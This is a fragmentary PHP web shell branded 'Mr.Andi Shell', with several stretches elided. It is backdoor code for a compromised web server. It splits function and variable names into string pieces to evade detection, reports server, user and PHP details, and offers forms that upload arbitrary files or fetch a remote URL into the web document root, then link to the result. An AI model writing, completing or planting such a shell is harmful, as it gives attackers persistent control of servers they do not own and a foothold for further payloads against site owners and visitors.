...
<html>
<head>
	<?php echo "<title>Mr.Andi Shell</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://kosred.com/a/tpcqx.jpg" type="image/x-icon">
</head>
...
<center>
<?php
echo '<font face="Bungee" size="5">Mr.Andi Shell</font></center>
...
if (empty($disfunc)) {
	$disf = "<font color='yellow'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>Create By Mr.Andi<br><a href='https://instagram.com/lynxx_445' target='_blank'>Click My Instagram</a></center>";
	exit();
}
...
echo "IP Server : <font color=yellow>".ipsrv()."</font> &nbsp;/&nbsp; Your IP : <font color=yellow>".$_SERVER[$rad]."</font><br>";
echo "Web Server : <font color='yellow'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "System : <font color='yellow'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "User : <font color='yellow'>".@$gcu()."&nbsp;</font>( <font color='yellow'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PHP Version : <font color='yellow'>".@$phv()."</font><br>";
		...
		if (empty($_FILES['berkas']['name'])) {
			...
			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
					...
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='yellow'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='yellow'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
		...
		if (empty($_POST['namalink'])) {
			...
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
				...
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					...
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='yellow'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='yellow'>".$lwb."</font></a><br>";
					}
...
<input type="text" name="darilink" class="up" placeholder="https://instagram.com/lynxx_445.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
